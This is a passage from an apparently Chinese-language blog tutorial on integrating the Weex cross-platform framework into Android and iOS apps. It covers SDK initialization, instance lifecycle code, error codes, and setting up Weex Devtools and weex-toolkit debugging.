<h2 id="3-声明权限"><a href="#3-声明权限" class="headerlink" title="3. 声明权限"></a>3. 声明权限</h2><p>在AndroidManifest.xml中声明权限<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">//网络</span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.ACCESS_NETWORK_STATE"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">//sd卡读写</span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_EXTERNAL_STORAGE"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_EXTERNAL_STORAGE"</span>/&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="4-初始化sdk"><a href="#4-初始化sdk" class="headerlink" title="4. 初始化sdk"></a>4. 初始化sdk</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">InitConfig config = new InitConfig.Builder()</span><br><span class="line">					//图片库接口</span><br><span class="line">    				.setImgAdapter(new FrescoImageAdapter())</span><br><span class="line">    				//网络库接口</span><br><span class="line">    				.setHttpAdapter(new InterceptWXHttpAdapter())</span><br><span class="line">    				.build();</span><br><span class="line">WXSDKEngine.initialize(applicationContext,config);</span><br></pre></td></tr></table></figure>
<p>demo初始化源码<br>其它扩展配置看这里</p>
<h2 id="5-创建WXSDKInstance"><a href="#5-创建WXSDKInstance" class="headerlink" title="5. 创建WXSDKInstance"></a>5. 创建WXSDKInstance</h2><p>WXSDKInstance是weex渲染页面的基本单元，</p>
<ol>
<li>通过instance.render(url)拉取bundle，</li>
<li>在回调IWXRenderListener的onViewCreated返回创建的view，</li>
<li>将返回的view 添加到Activity的view上（rootView）<br>参见源码: WXPageActivity<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class MainActivity extends AppCompatActivity implements IWXRenderListener &#123;</span><br><span class="line">  WXSDKInstance mWXSDKInstance;</span><br><span class="line">  @Override</span><br><span class="line">  protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">    super.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    mWXSDKInstance = new WXSDKInstance(this);</span><br><span class="line">    mWXSDKInstance.registerRenderListener(this);</span><br><span class="line">    /**</span><br><span class="line">    * bundleUrl source http://dotwe.org/vue/38e202c16bdfefbdb88a8754f975454c</span><br><span class="line">    */</span><br><span class="line">    String pageName = &quot;WXSample&quot;;</span><br><span class="line">    String bundleUrl = &quot;http://dotwe.org/raw/dist/38e202c16bdfefbdb88a8754f975454c.bundle.wx&quot;;</span><br><span class="line">    mWXSDKInstance.renderByUrl(pageName, bundleUrl, null, null,WXRenderStrategy.APPEND_ASYNC);</span><br><span class="line">  &#125;</span><br><span class="line">  @Override</span><br><span class="line">  public void onViewCreated(WXSDKInstance instance, View view) &#123;</span><br><span class="line">    setContentView(view);</span><br><span class="line">  &#125;</span><br><span class="line">  @Override</span><br><span class="line">  public void onRenderSuccess(WXSDKInstance instance, int width, int height) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  @Override</span><br><span class="line">  public void onRefreshSuccess(WXSDKInstance instance, int width, int height) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  @Override</span><br><span class="line">  public void onException(WXSDKInstance instance, String errCode, String msg) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  @Override</span><br><span class="line">  protected void onResume() &#123;</span><br><span class="line">    super.onResume();</span><br><span class="line">    if(mWXSDKInstance!=null)&#123;</span><br><span class="line">      mWXSDKInstance.onActivityResume();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  @Override</span><br><span class="line">  protected void onPause() &#123;</span><br><span class="line">    super.onPause();</span><br><span class="line">    if(mWXSDKInstance!=null)&#123;</span><br><span class="line">       mWXSDKInstance.onActivityPause();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  @Override</span><br><span class="line">  protected void onStop() &#123;</span><br><span class="line">    super.onStop();</span><br><span class="line">    if(mWXSDKInstance!=null)&#123;</span><br><span class="line">      mWXSDKInstance.onActivityStop();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  @Override</span><br><span class="line">  protected void onDestroy() &#123;</span><br><span class="line">    super.onDestroy();</span><br><span class="line">    if(mWXSDKInstance!=null)&#123;</span><br><span class="line">      mWXSDKInstance.onActivityDestroy();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="6-运行app"><a href="#6-运行app" class="headerlink" title="6. 运行app"></a>6. 运行app</h2><p>运行app，您将会看到一个 hello world 页面。<br>Hello World Demo 源码<br>提示: 点击二维码, 可以看到最终编译的代码产物。</p>
<h2 id="7-扩展Android能力"><a href="#7-扩展Android能力" class="headerlink" title="7. 扩展Android能力"></a>7. 扩展Android能力</h2><p>Weex 提供了能力扩展机制，可以根据自己的业务进行定制自己的功能。 主要分为：</p>
<ol>
<li>Module 扩展， 非 UI 的特定功能。例如 sendHttp、openURL 等。</li>
<li>Component 扩展， 实现特别功能的 Native 控件。例如：RichTextview，RefreshListview 等。</li>
<li>Adapter 扩展， Weex 对一些基础功能实现了统一的接口，可实现这些接口来定制自己的业务。例如：图片下载等。</li>
</ol>
<h1 id="集成-Weex-到-iOS"><a href="#集成-Weex-到-iOS" class="headerlink" title="集成 Weex 到 iOS"></a>集成 Weex 到 iOS</h1><p>使用 CocoaPods 或 Carthage 可以方便地将 Weex 集成到自己的项目中。</p>
<h2 id="1-配置依赖"><a href="#1-配置依赖" class="headerlink" title="1. 配置依赖"></a>1. 配置依赖</h2><p>使用 CocoaPods<br>从 Cocoapods 仓库中获取 WeexSDK 的最新版本。</p>
<p>将 WeexSDK 添加到你的 Podfile 中。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source &apos;git@github.com:CocoaPods/Specs.git&apos;</span><br><span class="line">target &apos;YourTarget&apos; do</span><br><span class="line">    platform :ios, &apos;8.0&apos;</span><br><span class="line">    pod &apos;WeexSDK&apos;, &apos;0.20.1&apos;</span><br><span class="line">end</span><br></pre></td></tr></table></figure></p>
<p>运行 pod install 命令安装依赖。</p>
<p>使用 Carthage<br>在工程中创建一个 Cartfile，Carthage 使用方法。</p>
<p>添加 github “apache/incubator-weex” 到 Cartfile</p>
<p>运行 carthage update。</p>
<h2 id="2-初始化-Weex"><a href="#2-初始化-Weex" class="headerlink" title="2. 初始化 Weex"></a>2. 初始化 Weex</h2><p>建议在 didFinishLaunchingWithOptions 回调中初始化 Weex，你也可以在子线程中异步初始化，但需要确保渲染 Weex 页面前初始化已经全部完成。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// App configuration</span><br><span class="line">[WXAppConfiguration setAppGroup:@&quot;Your app group&quot;];</span><br><span class="line">[WXAppConfiguration setAppName:@&quot;Your app name&quot;];</span><br><span class="line">[WXAppConfiguration setAppVersion:@&quot;Your app version&quot;];</span><br><span class="line"></span><br><span class="line">//Initialize WeexSDK</span><br><span class="line">[WXSDKEngine initSDKEnvironment];</span><br><span class="line"></span><br><span class="line">//Register custom modules and components, optional.</span><br><span class="line">[WXSDKEngine registerComponent:@&quot;myview&quot; withClass:[MyViewComponent class]];</span><br><span class="line">[WXSDKEngine registerModule:@&quot;mymodule&quot; withClass:[MyWeexModule class]];</span><br><span class="line"></span><br><span class="line">//Register the implementation of protocol, optional.</span><br><span class="line">[WXSDKEngine registerHandler:[WXAppNavigationImpl new] withProtocol:@protocol(WXNavigationProtocol)];</span><br><span class="line"></span><br><span class="line">//Set the log level, optional</span><br><span class="line">[WXLog setLogLevel: WXLogLevelWarning];</span><br></pre></td></tr></table></figure></p>
<h2 id="3-创建一个-Weex-实例"><a href="#3-创建一个-Weex-实例" class="headerlink" title="3. 创建一个 Weex 实例"></a>3. 创建一个 Weex 实例</h2><p>你既可以在全页面中使用 Weex，也可以在一个 view 中渲染 Weex。只需要创建一个 Weex 实例并指定好回调方法，提供一个合法的 URL 就可以了。在 onCreate 回调方法中将根 view 添加到你想显示内容的地方，并通过 instance.frame = 来设置它的尺寸和位置。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#import &lt;WeexSDK/WXSDKInstance.h&gt;</span><br><span class="line"></span><br><span class="line">- (void)viewDidLoad</span><br><span class="line">&#123;</span><br><span class="line">    [super viewDidLoad];</span><br><span class="line">    _instance = [[WXSDKInstance alloc] init];</span><br><span class="line">    _instance.viewController = self;</span><br><span class="line">    _instance.frame = self.view.frame;</span><br><span class="line">    __weak typeof(self) weakSelf = self;</span><br><span class="line">    _instance.onCreate = ^(UIView *view) &#123;</span><br><span class="line">        [weakSelf.weexView removeFromSuperview];</span><br><span class="line">        weakSelf.weexView = view;</span><br><span class="line">        [weakSelf.view addSubview:view];</span><br><span class="line">    &#125;;</span><br><span class="line">    _instance.onFailed = ^(NSError *error) &#123;</span><br><span class="line">        //process failure, you could open an h5 web page instead or just show the error.</span><br><span class="line">    &#125;;</span><br><span class="line">    _instance.renderFinish = ^ (UIView *view) &#123;</span><br><span class="line">        //process renderFinish</span><br><span class="line">    &#125;;</span><br><span class="line">    NSURL *url = [[NSBundle mainBundle] URLForResource:@&quot;main&quot; withExtension:@&quot;js&quot;];</span><br><span class="line">    [_instance renderWithURL:url options:@&#123;@&quot;bundleUrl&quot;:[self.url absoluteString]&#125; data:nil];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="4-销毁实例"><a href="#4-销毁实例" class="headerlink" title="4. 销毁实例"></a>4. 销毁实例</h2><p>必须显式地销毁 Weex 实例，否则可能引起内存泄漏。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[instance destroyInstance];</span><br></pre></td></tr></table></figure></p>
<h2 id="5-扩展-Weex"><a href="#5-扩展-Weex" class="headerlink" title="5. 扩展 Weex"></a>5. 扩展 Weex</h2><p>Weex 支持自定义组件、模块，可以参考以下两篇文档。</p>
<ol>
<li>Extend iOS</li>
<li>Extend iOS with swift</li>
</ol>
<h2 id="6-在-iPad-中使用-Weex"><a href="#6-在-iPad-中使用-Weex" class="headerlink" title="6. 在 iPad 中使用 Weex"></a>6. 在 iPad 中使用 Weex</h2><p>当页面渲染完成后，屏幕再旋转，页面不会自动适配。所以，如果你的 App 允许屏幕旋转，务必在页面渲染前更新屏幕宽度。</p>
<p>前端样式中指定的坐标在渲染时会根据 屏幕宽度 和 当前页面的 view-port-width 进行换算。</p>
<p>修改 view-port-width 的方法，会影响前端代码，通常不要设置，默认为 750px。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">beforeCreate()&#123;</span><br><span class="line">    const meta = weex.requireModule(&apos;meta&apos;);</span><br><span class="line">    meta.setViewport(&#123;</span><br><span class="line">        width: 1536</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>监听 UIDeviceOrientationDidChangeNotification 通知，并调用下面方法修改屏幕尺寸（假设已经旋转完成，[UIScreen mainScreen].bounds.size.width 就是当前宽度）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[WXCoreBridge setDeviceSize:[UIScreen mainScreen].bounds.size];</span><br></pre></td></tr></table></figure></p>
<h1 id="WEEX常见错误码"><a href="#WEEX常见错误码" class="headerlink" title="WEEX常见错误码"></a>WEEX常见错误码</h1><p>概述</p>
<p>WEEX Android平台,各种异常错误码的含义。</p>
<h2 id="公共错误"><a href="#公共错误" class="headerlink" title="公共错误"></a>公共错误</h2><p><img src="https://mfaying.github.io/static/images/weex/12.jpg" alt=""><br><img src="https://mfaying.github.io/static/images/weex/13.jpg" alt=""><br><img src="https://mfaying.github.io/static/images/weex/14.jpg" alt=""></p>
<h2 id="平台特殊"><a href="#平台特殊" class="headerlink" title="平台特殊"></a>平台特殊</h2><p>Android<br>错误码：-2001<br>说明：load so 失败，sdk初始化失败<br>错误码：-2111<br>说明：jsc重启<br>错误码：-2112<br>说明：jsc进程Crash<br>错误码：9000<br>说明：sdk初始化失败<br>错误码：-9003<br>说明：jsfm 初始化失败<br>错误码：-9610<br>说明：callNativeModule 时，参数为空 （instanceid、args）</p>
<h2 id="集成Devtool到Android"><a href="#集成Devtool到Android" class="headerlink" title="集成Devtool到Android"></a>集成Devtool到Android</h2><h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p>注意：Android Weex DevTools 是三方插件, 不由 Apache Weex 开发或维护。</p>
<p>Weex Devtools 能够方便调试 Weex 页面，但此功能离不开 Native 的支持。如何让你的 App 也集成 Devtools，在本章将会详细说明 Android 端如何接入 Weex Devtools。<br><img src="https://mfaying.github.io/static/images/weex/14.jpg" alt=""></p>
<h2 id="Android接入指南"><a href="#Android接入指南" class="headerlink" title="Android接入指南"></a>Android接入指南</h2><p>一、添加依赖<br>可以通过Gradle 或者 Maven添加对devtools aar的依赖, 也可以直接对源码依赖.</p>
<p>Gradle依赖.<br>dependencies {<br>   compile ‘com.taobao.android:weex_inspector:0.18.10’<br>}<br>或者</p>
<p>Maven依赖.<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.taobao.android<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>weex_inspector<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.18.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>或者</p>
<p>源码依赖.<br>需要复制inspector目录到你的app的同级目录, 然后在工程的 settings.gradle 文件下添加 include “:inspector”, 此过程可以参考playground源码的工程配置及其配置, 然后在app的build.gralde中添加依赖.<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">   compile project(&apos;:inspector&apos;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>需要引入okhttp<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">   compile &apos;com.squareup.okhttp:okhttp:2.3.0&apos;</span><br><span class="line">   compile &apos;com.squareup.okhttp:okhttp-ws:2.3.0&apos;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="二、调试开关（扫码开启调试-手动开启调试）"><a href="#二、调试开关（扫码开启调试-手动开启调试）" class="headerlink" title="二、调试开关（扫码开启调试/手动开启调试）"></a>二、调试开关（扫码开启调试/手动开启调试）</h2><p>最简单方式就是复用Playground的相关代码,比如扫码和刷新等模块, 但是扫码不是必须的, 它只是与app通信的一种形式, 二维码里的包含DebugServer IP及bundle地址等信息,用于建立App和Debug Server之间的连接及动态加载bundle. 在Playground中给出了两种开启debug模式的范例.</p>
<p>范例1: 通过在XXXApplication中设置开关打开调试模式<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyApplication</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">super</span>.onCreate();</span><br><span class="line">  initDebugEnvironment(<span class="keyword">true</span>, <span class="string">"xxx.xxx.xxx.xxx"</span><span class="comment">/*"DEBUG_SERVER_HOST"*/</span>);</span><br><span class="line">  <span class="comment">//WXSDKEngine.reload();</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initDebugEnvironment</span><span class="params">(<span class="keyword">boolean</span> enable, String host)</span> </span>&#123;</span><br><span class="line">  WXEnvironment.sRemoteDebugMode = enable;</span><br><span class="line">  WXEnvironment.sRemoteDebugProxyUrl = <span class="string">"ws://"</span> + host + <span class="string">":8088/debugProxy/native"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这种方式最直接, 在代码中直接hardcode了开启调试模式, 如果在SDK初始化之前调用甚至连WXSDKEngine.reload()都不需要调用, 接入方如果需要更灵活的策略可以将initDebugEnvironment(boolean enable, String host)和WXSDKEngine.reload()组合在一起在合适的位置和时机调用即可.（如果不是初始化之前调用，n那么每次调用initDebugEnvironment后必须调用WXSDKEngine.reload()刷新Weex引擎）</p>
<p>范例2:通过扫码打开调试模式<br>Playground中较多的使用扫描weex debugger生成的调试二维码的方式传递信息, 不仅用这种方式控制Debug模式的开关,而且还通过它来传入bundle的url直接调试. 应当说在开发中这种方式是比较高效的, 省去了修改sdk代码重复编译和安装App的麻烦.</p>
<p>拦截方式：</p>
<p>if (WXEnvironment.isApkDebugable()) {<br>  String devToolUrl = uri.getQueryParameter(“_wx_devtool”);<br>  if (!TextUtils.isEmpty(devToolUrl)) {<br>    WXEnvironment.sRemoteDebugProxyUrl = devToolUrl;<br>    WXEnvironment.sDebugServerConnectable = true;<br>    WXSDKEngine.reload(XXXXX.getApplication(), false);<br>  }<br>}</p>
<p>可选：调试刷新协议<br>广播 ACTION_DEBUG_INSTANCE_REFRESH 在调试模式切换和 Chrome 调试页面刷新时发出，主要用来通知当前的 Weex容器以 Debug 模式重新加载当前页。在 playground 中的处理过程如下：<br>  public class RefreshBroadcastReceiver extends BroadcastReceiver {<br>    @Override<br>    public void onReceive(Context context, Intent intent) {<br>      if (IWXDebugProxy.ACTION_DEBUG_INSTANCE_REFRESH.equals(intent.getAction())) {<br>        //Do something<br>      }<br>    }<br>  }</p>
<h2 id="Devtools组件介绍"><a href="#Devtools组件介绍" class="headerlink" title="Devtools组件介绍"></a>Devtools组件介绍</h2><p>Devtools扩展了Chrome Debugging Protocol, 在客户端和调试服务器之间的采用JSON-RPC作为通信机制, 本质上调试过程是两个进程间协同, 相互交换控制权及运行结果的过程. 更多细节还请阅读Weex Devtools Debugger的技术选型实录这篇文章.</p>
<p>客户端 Devtools 客户端作为aar被集成App中, 它通过webscoket连接到调试服务器,此处并未做安全检查. 出于安全机制及包大小考虑, 强烈建议接入方只在debug版本中打包此aar.</p>
<p>服务器 Devtools 服务器端是信息交换的中枢, 既连接客户端, 又连接Chrome, 大多数情况下扮演一个消息转发服务器和Runtime Manager的角色.</p>
<p>Web端 Chrome的V8引擎扮演着bundle javascript runtime的角色. 开启debug模式后, 所有的bundle js 代码都在该引擎上运行. 另一方面我们也复用了Chrome前端的调试界面, 例如设置断点, 查看调用栈等, 调试页关闭则runtime将会被清理.</p>
<p>调试的大致过程请参考如下时序图.<br><img src="https://mfaying.github.io/static/images/weex/16.jpg" alt=""></p>
<h1 id="集成Devtool到ios"><a href="#集成Devtool到ios" class="headerlink" title="集成Devtool到ios"></a>集成Devtool到ios</h1><p>注意：iOS Weex DevTools 是三方插件, 不由 Apache Weex 开发或维护。</p>
<p>Weex Devtools 能够方便调试 Weex 页面，但此功能离不开 Native 的支持。如何让你的 App 也集成 Devtools，在本章将会详细说明 iOS 端如何接入 Weex Devtools。</p>
<ol>
<li>iOS 应用接入DevTool</li>
<li>和Debug Server 配合使用<br><img src="https://mfaying.github.io/static/images/weex/17.jpg" alt=""></li>
</ol>
<h2 id="iOS接入指南"><a href="#iOS接入指南" class="headerlink" title="iOS接入指南"></a>iOS接入指南</h2><p>添加依赖<br>建议在DEBUG模式下依赖</p>
<h1 id="方法1-cocoapods-依赖"><a href="#方法1-cocoapods-依赖" class="headerlink" title="方法1: cocoapods 依赖"></a>方法1: cocoapods 依赖</h1><p>在工程目录的 podfile 添加如下代码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source https://github.com/CocoaPods/Specs.git，</span><br><span class="line">pod  &apos;WXDevtool&apos;, &apos;0.20.0&apos;, :configurations =&gt; [&apos;Debug&apos;]，</span><br></pre></td></tr></table></figure></p>
<p>可以通过更新本地 podspec repo，pod search 来查询最新版本，在 podfile 文件添加依赖。</p>
<h2 id="方法二：github-源码依赖"><a href="#方法二：github-源码依赖" class="headerlink" title="方法二：github 源码依赖"></a>方法二：github 源码依赖</h2><ol>
<li>git clone <a href="mailto:git@github.com">git@github.com</a>:weexteam/weex-devtool-iOS.git</li>
<li>如下图示：拖动source目录源文件到目标工程中<br><img src="https://mfaying.github.io/static/images/weex/18.jpg" alt=""></li>
</ol>
<h2 id="集成功能"><a href="#集成功能" class="headerlink" title="集成功能"></a>集成功能</h2><p>参考PlayGround中的实现<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//方法1 pod依赖方式</span><br><span class="line">#import &lt;TBWXDevtool/WXDevtool.h&gt;</span><br><span class="line"></span><br><span class="line">//方法2 源码依赖方式</span><br><span class="line">#import &quot;WXDevtool.h&quot;</span><br></pre></td></tr></table></figure></p>
<p>查看 WXDevtool 头文件如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@interface WXDevTool : NSObject</span><br><span class="line"></span><br><span class="line">+ (void)setDebug:(BOOL)isDebug;</span><br><span class="line"></span><br><span class="line">+ (BOOL)isDebug;</span><br><span class="line"></span><br><span class="line">+ (void)launchDevToolDebugWithUrl:(NSString *)url;</span><br><span class="line"></span><br><span class="line">@end</span><br></pre></td></tr></table></figure></p>
<p>setDebug：参数为 YES 时，直接开启调试模式，反之关闭，使用场景如下所述</p>
<h2 id="扫码调试"><a href="#扫码调试" class="headerlink" title="扫码调试"></a>扫码调试</h2><p>如果你的应用中存在扫码功能或即将集成扫码功能，推荐使用该方式进行集成，Demo 地址见: Playground App</p>
<p>核心代码为获取扫码链接中的_wx_devtool参数，并将调试工具与调试服务器链接：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[WXDevTool launchDevToolDebugWithUrl:@&quot;ws://&#123;ip&#125;:&#123;port&#125;/debugProxy/native/&#123;channelid&#125;&quot;];</span><br></pre></td></tr></table></figure></p>
<h2 id="直接链接"><a href="#直接链接" class="headerlink" title="直接链接"></a>直接链接</h2><p>如果你需要直接让你的应用链接上Weex调试工具，你需要通过如下方式进行集成：</p>
<p>命令行运行weex debug –port 8888 –channelid 1 去指定端口号及调试进程ID.<br>添加如下代码到你的应用中，注意替换对应的{ip},{port},{channelid}为你本地的值。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[WXDevTool setDebug:NO];</span><br><span class="line">[WXDevTool launchDevToolDebugWithUrl:@&quot;ws://&#123;ip&#125;:&#123;port&#125;/debugProxy/native/&#123;channelid&#125;&quot;];</span><br></pre></td></tr></table></figure></p>
<p>如果程序一启动就开启 Weex 调试，需要在 WeexSDK 引擎初始化之前添加代码，同时需要将Debug开关设置为NO，进入调试界面后再打开JS Debug开关（服务链接时对于纯weex项目会丢失首屏Weex页面的消息导致白屏）。</p>
<h2 id="附加页面刷新功能"><a href="#附加页面刷新功能" class="headerlink" title="附加页面刷新功能"></a>附加页面刷新功能</h2><p>什么场景下需要添加页面刷新功能?</p>
<p>切换 JSDebug 开关时刷新页面<br>刷新 Chrome 页面（command+R）<br>如下图所示，在快速导航功能中需要能够刷新当前weex实例，同时，在切换JSDebug按钮状态时也需要将运行环境会从手机端（JavaScriptCore）切换到 Chrome（V8），这时需要重新初始化 Weex 环境，重新渲染页面。页面渲染是需要接入方在自己的页面添加。<br><img src="https://mfaying.github.io/static/images/weex/19.jpg" alt=""></p>
<p>如何添加刷新</p>
<p>具体实现可参考 Playground AppWXDemoViewController.m 例子<br>在 Weex 页面初始化或 viewDidLoad 方法时添加注册通知，举例如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[[NSNotificationCenter defaultCenter] addObserver:self selector:notificationRefreshInstance: name:@&quot;RefreshInstance&quot; object:nil];</span><br></pre></td></tr></table></figure></p>
<p>最后千万记得在 dealloc 方法中取消通知，如下所示<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- (void)dealloc</span><br><span class="line">&#123;</span><br><span class="line">    [[NSNotificationCenter defaultCenter] removeObserver:self];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>页面刷新实现，先销毁当前 instance，然后重新创建 instance，举例如下:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- (void)render</span><br><span class="line">  &#123;</span><br><span class="line">    CGFloat width = self.view.frame.size.width;</span><br><span class="line">    [_instance destroyInstance];</span><br><span class="line">    _instance = [[WXSDKInstance alloc] init];</span><br><span class="line">    _instance.viewController = self;</span><br><span class="line">    _instance.frame = CGRectMake(self.view.frame.size.width-width, 0, width, _weexHeight);</span><br><span class="line"></span><br><span class="line">    __weak typeof(self) weakSelf = self;</span><br><span class="line">    _instance.onCreate = ^(UIView *view) &#123;</span><br><span class="line">        [weakSelf.weexView removeFromSuperview];</span><br><span class="line">        weakSelf.weexView = view;</span><br><span class="line">        [weakSelf.view addSubview:weakSelf.weexView];</span><br><span class="line">        UIAccessibilityPostNotification(UIAccessibilityScreenChangedNotification,  weakSelf.weexView);</span><br><span class="line">    &#125;;</span><br><span class="line">    _instance.onFailed = ^(NSError *error) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line">    _instance.renderFinish = ^(UIView *view) &#123;</span><br><span class="line">        [weakSelf updateInstanceState:WeexInstanceAppear];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    _instance.updateFinish = ^(UIView *view) &#123;</span><br><span class="line">    &#125;;</span><br><span class="line">    if (!self.url) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    NSURL *URL = [self testURL: [self.url absoluteString]];</span><br><span class="line">    NSString *randomURL = [NSString stringWithFormat:@&quot;%@?random=%d&quot;,URL.absoluteString,arc4random()];</span><br><span class="line">    [_instance renderWithURL:[NSURL URLWithString:randomURL] options:@&#123;@&quot;bundleUrl&quot;:URL.absoluteString&#125; data:nil];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>说明：目前版本需要注册的通知名称为固定的 “RefreshInstance”，下个版本会添加用户自定义 name 。</p>
<h1 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h1><p>注意：weex-toolkit 是三方插件, 不由 Apache Weex 开发或维护。<br>本文档主要演示如何使用 weex-toolkit 中内置的调试工具进行代码调试。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>首先需要通过 npm 或 yarn 安装 weex-toolkit 工具</p>
<p>$ npm i weex-toolkit@beta -g<br>$ weex -v // 检查是否安装成功</p>
<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>安装完成后，运行 weex debug 命令启动调试控制台，运行后程序将会自动打开如下界面:<br><img src="https://mfaying.github.io/static/images/weex/20.jpg" alt=""><br>如果你有需要编译的页面，你也可以通过 weex debug [ folder | file ] 命令进行编译，如运行 weex debug src ，编译后的页面将会在 页面 这个标签下显示，如图所示：<br><img src="https://mfaying.github.io/static/images/weex/21.jpg" alt=""></p>
<p>开始调试<br>TIP</p>
<p>在调试开始前，请确保安装了调试应用的手机与PC处于同一局域网下，同时关闭VPN等代理设置，否则将无法正常进行调试，同时，我们在使用功能时，尽量保证其他功能为关闭状态，如在使用JS调试功能时将无关的网络审查功能关闭，将会有更好的开发体验。</p>
<p>调试需要使用集成了Weex调试工具的APP进行扫码调试，相关文档可参考：</p>
<p>[1] Android Weex Detool集成文档。<br>[2] iOS Weex Detool集成文档。</p>
<p>你也可以使用Weex官方提供的Playground App进行代码调试，下载地址见：Weex Playground。</p>
<p>回到调试二维码页面，用应用的扫码功能进行扫码，即可进入调试控制台，如图所示：<br><img src="https://mfaying.github.io/static/images/weex/22.jpg" alt=""></p>
<p>初次进入调试界面会有提示界面引导你了解调试中会使用的相关功能，对于首次使用调试工具的开发者建议完整看完所有提示。</p>
<h1 id="JS调试"><a href="#JS调试" class="headerlink" title="JS调试"></a>JS调试</h1><p>开启JS调试功能即可进入Weex代码调试模式，如图所示：<br><img src="https://mfaying.github.io/static/images/weex/23.jpg" alt=""></p>
<p>日志等级<br>通过控制台及日志等级选项对日志进行筛选过滤，保留你关注的日志内容，如图所示：<br><img src="https://mfaying.github.io/static/images/weex/24.jpg" alt=""></p>
<p>网络审查<br>开启网络审查功能可以查看应用的网络请求信息，对页面的请求进行有效的分析，如图所示：<br><img src="https://mfaying.github.io/static/images/weex/25.jpg" alt=""></p>
<p>节点审查<br>TIP</p>
<p>节点审查模式下会发送大量的页面信息，默认情况下为开启状态，在页面较为复杂的情况下，我们一般建议通过重置台的预览按钮关闭该功能，否则可能会影响到JS调试相关功能的速度。</p>
<p>通过选择切换视图选项可切换当前视图的显示情况，可对页面的视图层级进行对应分析，如图所示：<br><img src="https://mfaying.github.io/static/images/weex/26.jpg" alt=""></p>
<p>拓展功能<br>以下拓展功能需在JS调试功能开启并且处于Weex页面内才可使用。<br>快速导航<br><img src="https://mfaying.github.io/static/images/weex/27.jpg" alt=""></p>
